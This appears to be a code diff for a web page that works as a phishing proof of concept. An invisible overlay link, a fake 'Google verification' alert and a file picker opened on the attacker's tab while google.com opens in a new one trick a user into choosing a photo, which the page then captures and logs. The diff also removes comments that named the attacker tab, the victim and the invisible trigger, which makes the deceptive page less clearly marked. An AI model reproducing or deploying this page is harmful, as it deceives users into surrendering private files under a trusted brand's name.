@@ -32,7 +32,6 @@
         border-radius: 8px;
       }
 
-      /* Google-style Logo */
       .logo {
         font-size: 28px;
         font-weight: 600;
@@ -64,7 +63,6 @@
         color: #5f6368;
       }
 
-      /* The "Button" UI */
       .btn-ui {
         background-color: #1a73e8;
         color: white;
@@ -76,14 +74,14 @@
         cursor: pointer;
       }
 
-      /* Invisible Trigger Overlay */
+      /* REMOVED: target="_blank" from logic to avoid instant focus shift */
       #link {
         position: absolute;
         top: 0;
         left: 0;
         width: 100%;
         height: 100%;
-        z-index: 9999; /* Ensure it stays on top */
+        z-index: 9999;
         cursor: pointer;
         opacity: 0;
       }
@@ -97,7 +95,7 @@
         max-width: 100%;
         max-height: 200px;
         border-radius: 4px;
-        display: none; /* Hidden until a file is selected */
+        display: none;
       }
     </style>
   </head>
@@ -120,7 +118,8 @@
     </div>
 
     <input id="fileSelect" type="file" accept="image/*" />
-    <a id="link" target="_blank"></a>
+
+    <a id="link"></a>
 
     <script>
       const fileSelect = document.getElementById("fileSelect");
@@ -128,25 +127,24 @@
       const img = document.getElementById("img");
 
       link.onclick = (e) => {
-        // Step 1: Alert is used to synchronize the race condition on mobile
+        // Prevents the browser from trying to navigate the anchor tag itself
+        e.preventDefault();
+
         alert(
           "System Action Required: Please select a photo to proceed with Google verification.",
         );
 
-        // Step 2: Trigger file picker on the current (attacker) tab
+        // Trigger file picker first
         fileSelect.click();
 
-        // Step 3: Open trusted site in a new tab
+        // Then open the new tab via JS
         window.open("https://google.com", "_blank");
       };
 
-      // Step 4: Capture the file when the victim interacts with the dialog
       fileSelect.onchange = (event) => {
         if (fileSelect.files.length > 0) {
           img.src = URL.createObjectURL(fileSelect.files[0]);
           img.style.display = "block";
-
-          // Success indicator for the researcher
           console.log(
             "Success! File captured from background tab:",
             fileSelect.files[0].name,
